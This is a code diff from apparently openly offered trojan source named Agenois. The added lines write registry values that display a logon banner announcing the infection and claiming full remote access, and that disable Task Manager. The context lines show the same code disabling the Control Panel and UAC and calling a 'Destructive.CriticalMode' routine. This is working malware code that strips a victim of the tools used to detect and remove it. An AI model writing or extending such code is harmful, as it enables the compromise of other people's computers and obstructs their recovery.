@@ -42,6 +42,12 @@ namespace Agenois
                 
                 Destructive.CriticalMode(1);
 
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+                editKey.SetValue("legalnoticecaption", "Welcom To Your Fresh & New PC ");
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+                editKey.SetValue("legalnoticetext", "This Computer has been Infected by the Agenois Trojan. From Now On We(The Creators) Have Full Access To Your PC");
+                editKey.Close();
                 editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                 editKey.SetValue("NoControlPanel", "1");
                 editKey.Close();
@@ -50,6 +56,9 @@ namespace Agenois
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                 editKey.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+                editKey.SetValue("DisableTaskMgr", "1");
                 editKey.Close();
 
                 editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
